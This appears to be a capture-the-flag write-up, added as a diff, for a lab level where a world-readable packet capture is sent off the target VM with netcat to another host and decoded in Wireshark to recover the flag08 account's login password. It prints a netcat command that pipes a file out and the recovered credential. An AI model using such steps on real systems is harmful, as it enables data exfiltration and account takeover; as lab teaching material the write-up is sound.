@@ -1,0 +1,21 @@
+World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
+
+In /home/flag08 we can see a .pcap file. We can preview the packet file using tcpdump, but collecting data this way is pretty hard. 
+We can copy the file from vm to local machine using netcat. First set netcat to listen on local machine using:
+> nc -l 20000 > out.pcap
+This way all data received is redirected to the file. Then on vm we have to connect and send original capture.pcap. 
+> cat capture.pcap | nc 192.168.x.x 20000
+
+Now we can start wireshark and inspect data from packets in a more user friendly way.
+After inspecting data in hex we can see:
+62 61 63 6b 64 6f 6f 72 7f 7f 7f 30 30 52 6d 38 7f 61 74 65 0d
+In ASCII:
+backdoor...00Rm8.ate
+
+After looking up in ASCII table 7f we know it's hex for DEL, which is backspace.
+Finally, recovered password is:
+backd00Rmate
+
+Now try logging to vm using login flag08 and password backd00Rmate. Success!
+> getflag
+You have successfully executed getflag on a target account.
